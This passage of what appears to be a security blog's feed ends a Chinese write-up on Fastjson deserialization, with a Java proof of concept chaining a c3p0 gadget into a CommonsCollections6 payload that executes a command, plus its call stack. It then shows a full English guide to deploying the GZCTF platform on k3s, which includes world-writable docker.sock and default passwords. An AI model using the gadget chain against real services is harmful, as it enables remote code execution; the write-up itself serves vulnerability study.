class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造 CC6 evil object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数调用栈，这里只给触发二次反序列化的第一次，后面的CC6就不放了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deserializeFromByteArray:143, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">fromByteArray:123, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)</span><br><span class="line">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)</span><br><span class="line">fireVetoableChange:375, VetoableChangeSupport (java.beans)</span><br><span class="line">fireVetoableChange:271, VetoableChangeSupport (java.beans)</span><br><span class="line">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:46, POC_1_2_47 (Poc.c3p0)</span><br></pre></td></tr></table></figure><h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://tttang.com/archive/1886/">https://tttang.com/archive/1886/</a></li><li><a href="https://blog.csdn.net/uuzeray/article/details/136563391">https://blog.csdn.net/uuzeray/article/details/136563391</a></li></ul><h2 id="Commons-io-写⽂件-webshell-TODO"><a href="#Commons-io-写⽂件-webshell-TODO" class="headerlink" title="Commons-io 写⽂件&#x2F;webshell TODO"></a>Commons-io 写⽂件&#x2F;webshell TODO</h2><p>以后再来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TemplatesImpl-链&quot;&gt;&lt;a href=&quot;#TemplatesImpl-链&quot; class=&quot;headerlink&quot; title=&quot;TemplatesImpl 链&quot;&gt;&lt;/a&gt;TemplatesImpl 链&lt;/h2&gt;&lt;h3 id=&quot;影响范围&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Fastjson" scheme="https://jaspersec.top/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>GZCTF Platform Deployment with k3s</title>
    <link href="https://jaspersec.top/posts/334536658.html"/>
    <id>https://jaspersec.top/posts/334536658.html</id>
    <published>2025-01-01T16:41:02.000Z</published>
    <updated>2025-04-02T12:07:54.940Z</updated>
    
    <content type="html"><![CDATA[<p> <a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#x78;&#109;&#99;&#118;&#x65;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x78;&#109;&#99;&#118;&#x65;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></li><li>联系QQ：1609410364</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GZ::CTF official guide document strongly recommended us to build GZCTF with <code>docker + k3s</code> solution , which can substains small &#x2F; middle  competition for public.</p><p>It means we need two servers at least,  <code>Docker</code> one  used to build gzctf frontend and <code>k3s</code> one for the containers backend.</p><h2 id="Local-Deployment"><a href="#Local-Deployment" class="headerlink" title="Local Deployment"></a>Local Deployment</h2><p>Asset Topology：</p><ul><li>192.168.1.100 : Used for GZCTF platform deployment (frontend)，OS: ubuntu 20.04</li><li>192.168.1.195 : Used for  k3s container cluster deployment (backend) ，OS ubuntu 20.04</li></ul><h3 id="k3s-Deployment"><a href="#k3s-Deployment" class="headerlink" title="k3s Deployment"></a>k3s Deployment</h3><p><strong><code>k3s</code> installation：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Domestic</span><br><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -</span><br><span class="line">## Foreign</span><br><span class="line">curl -sfL https://get.k3s.io | sh -</span><br><span class="line">## check the installation</span><br><span class="line">k3s -v</span><br></pre></td></tr></table></figure><p>NOTICE: Original config of k3s can’t pull docker images for some reasons. So we need to set  third-party image proxy.</p><p>Just add onfigration to <code>/etc/rancher/k3s/registries.yaml</code> like below:</p><figure class="highlight yaml"><figcaption><span>title:"/etc/rancher/k3s/registries.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mirrors:</span></span><br><span class="line">  <span class="attr">&quot;docker.io&quot;:</span></span><br><span class="line">    <span class="attr">endpoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.littlediary.cn&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.xdark.top&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://cjie.eu.org&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.1panel.live&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.unsee.tech&quot;</span></span><br></pre></td></tr></table></figure><p><strong><code>Kuboard</code> installation</strong> , a WebUI of <code>k3s</code> for convenience of control k3s.  Kuboard depends on <code>dcoker</code>, so we install <code>docker</code> and <code>docker-compose</code> first.</p><p>Install <code>docker</code> and <code>docker-compose</code> command：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">## Install docker-compose</span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">## Install docker</span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line">## Optional,  make docker/docker-compose command don&#x27;t need type &quot;sudo&quot; front of them anymore. </span><br><span class="line">## It&#x27;s troublesome to always input the password :x</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>next, install <code>Kuboard</code>. Actually, Code block below just pull a docker image and  run a web container.  </p><p>Just try <code>chmod +x run_kuboard.sh &amp;&amp; ./run_kuboard.sh</code> command to  run the below shell script.</p><p>NOTICE: <code>KUBOARD_BASE_URL</code>  need to change to your own k3s vps, for me it’s <code>http://192.168.0.195</code></p><figure class="highlight shell"><figcaption><span>title:"run_kuboard.sh"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Run the Docker container</span></span></span><br><span class="line">docker run -d \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  --name=kuboard \</span><br><span class="line">  -p 3271:80/tcp \</span><br><span class="line">  -p 10081:10081/tcp \</span><br><span class="line">  -e KUBOARD_ENDPOINT=&quot;http://192.168.0.195:3271&quot; \</span><br><span class="line">  -e KUBOARD_AGENT_SERVER_TCP_PORT=&quot;10081&quot; \</span><br><span class="line">  -v /root/kuboard-data:/data \</span><br><span class="line">  swr.cn-east-2.myhuaweicloud.com/kuboard/kuboard:v3</span><br></pre></td></tr></table></figure><p>After that, just visit <code>http://192.168.1.195:3271</code> to see the kuboard panel. Default account is : <code>admin/Kuboard123</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3db4357cc5185f9a28c8e1ac36a2df15.png"></p><p>Now we got <code>k3s</code> and <code>kuboard</code>, but <code>k3s</code> has not been bound to <code>kuboard</code> yet. We need to add k3s cluster to kuboard.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/be7e875340711f18e5c312ce0118ff97.png"></p><p>There are two inputs that we need to pay attention to,  <code>kubeconfig</code> and <code>ApiServer地址</code>. <code>名称</code> and <code>描述</code> just take a name and description you want  And the <code>Context</code> position just have one chioce which is <code>default</code> after we set  <code>kubeconfig</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3c62c14f28c66098dddd2916a9becc9a.png"></p><p>For the  <code>kubeconfig</code> position, We need to <strong>completely</strong> copy the content of file in <code>/etc/rancher/k3s/k3s.yaml</code>.</p><figure class="highlight yaml"><figcaption><span>title:"kubeconfig"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tL....</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://127.0.0.1:6443</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">preferences:</span> &#123;&#125;</span><br><span class="line"><span class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">client-certificate-data:</span> <span class="string">LS0tL....</span></span><br><span class="line">    <span class="attr">client-key-data:</span> <span class="string">LS0tLS....</span></span><br></pre></td></tr></table></figure><p>For the <code>ApiServer地址</code> position, we need to input the k3s server ip, <code>kuboard</code> and <code>k3s</code> is the same vps in this case, so just set below:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.0.195:6443</span><br></pre></td></tr></table></figure><p><strong>Finally</strong>,  we bound k3s to kuboard, the last operation is to set the access rule of  k3s like below picture.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f424cd5a67982f32102ba9f953fa9a30.png"></p><h3 id="GZCTF-Deployment"><a href="#GZCTF-Deployment" class="headerlink" title="GZCTF Deployment"></a>GZCTF Deployment</h3><p>GZCTF frontend platform deployed by <code>docker-compose</code>.  The main file is docker-compose.yml, but it depends on <code>appsettings.json</code> and <code>kube-config.yaml</code>. So there are three file we need to create and config, structure like below.</p><figure class="highlight plaintext"><figcaption><span>title:"create basic env"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/gzctf</span><br><span class="line">cd ~/gzctf</span><br><span class="line">tree .               </span><br><span class="line">.</span><br><span class="line">├── appsettings.json</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">└── kube-config.yaml</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure><p>Docker is necessary to build it, so we install <code>docker</code> first:</p><figure class="highlight bash"><figcaption><span>title:"docker install"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Install docker</span></span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line"><span class="comment">## Optional, make docker/docker-compose command don&#x27;t need sudo at the beginning anymore. </span></span><br><span class="line"><span class="comment">## It&#x27;s troublesome to always input the password :x</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo <span class="built_in">chmod</span> a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>For the same reason of network, we need to set image proxy config. Just run the below shell script.  The brand new third-party proxy address is illustrated by here: <a href="https://www.cnblogs.com/alex-oos/p/18417200">https://www.cnblogs.com/alex-oos/p/18417200</a>.</p><figure class="highlight shell"><figcaption><span>title</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;:[</span><br><span class="line">  &quot;https://hub.xdark.top&quot;,</span><br><span class="line">  &quot;https://hub.littlediary.cn&quot;,</span><br><span class="line">  &quot;https://cjie.eu.org&quot;,</span><br><span class="line">  &quot;https://docker.1panel.live&quot;,</span><br><span class="line">  &quot;https://docker.unsee.tech&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>Then we need to config the three necessary files, let’s config them one by one.  All my configrations refers to  <a href="https://gzctf.gzti.me/guide/start/quick-start.html">Quick Start - GZ::CTF</a> .</p><p>Firstly, the <code>docker-compose.yml</code> is the main file to build the gzctf platform. Below is my configration:</p><figure class="highlight yml"><figcaption><span>title:"docker-compose.yml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-shanghai.aliyuncs.com/gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=123456&quot;</span></span><br><span class="line">      <span class="comment">## choose your backend language `en_US` / `zh_CN` / `ja_JP`</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span> <span class="comment">## this is required for k8s deployment</span></span><br><span class="line">      <span class="comment">## - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; ## this is required for docker deployment</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cache</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=password_here&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><p>The <code>appsettings.json</code> shows the basic configration of GZ::CTF paltform, such as database address, public entry, etc.</p><figure class="highlight json"><figcaption><span>title:appsettings.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=password_here&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SenderAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SenderName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">587</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JasperSecretKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kubernetes&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.0.195&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>kube-config.yaml</code> is used to build a brige between gzctf platform (frontend) and k3s clusters (backend). Just copy the contents of <code>/etc/rancher/k3s/k3s.yaml</code> in k3s vps and change the <code>server</code> properties to <code>ApiServer地址</code> we set before.</p><figure class="highlight yaml"><figcaption><span>title:"kube-config.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tLS...</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://192.168.0.195:6443</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">preferences:</span> &#123;&#125;</span><br><span class="line"><span 